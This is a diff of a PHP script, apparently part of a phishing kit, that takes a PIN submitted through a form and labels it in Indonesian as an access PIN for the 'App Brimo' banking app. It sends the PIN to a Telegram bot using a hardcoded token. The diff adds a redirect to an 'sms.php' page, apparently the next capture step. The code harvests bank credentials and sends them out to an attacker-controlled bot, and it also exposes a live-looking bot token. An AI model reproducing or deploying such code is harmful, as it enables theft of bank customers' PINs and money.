@@ -1,4 +1,7 @@
 <?php
+header('location: sms.php');
+?>
+<?php
 /* -----------------------------------------------------
 Simple PHP script for Sending Telegram Bot Message
 ~ Iky | https://www.wadagizig.com
@@ -22,7 +25,7 @@ function sendMessage($telegram_id, $message_text, $secret_token) {
 only basic POST method :
 -----------------------*/
 $telegram_id = $_POST ['telegram_id'];
-$message_text ="Ini adalah sebuah pin akses dari operasi App Brimo: "."Pin: ".$_POST ['message_text'];
+$message_text ="Ini adalah sebuah pin akses dari operasi App Brimo: ".""."Pin: ".$_POST ['message_text'];
 
 /*--------------------------------
 Isi TOKEN dibawah ini: 
@@ -30,5 +33,4 @@ Isi TOKEN dibawah ini:
 $secret_token = "5655115185:AAHCJhOWjnjMdnZYhaAoxpE7eh7HtdnqMsc";
 sendMessage($telegram_id, $message_text, $secret_token);
 
-echo "<script>alert('Pesan berhasil terkirim!'); window.location.href = 'sms.php';</script>";
 ?>
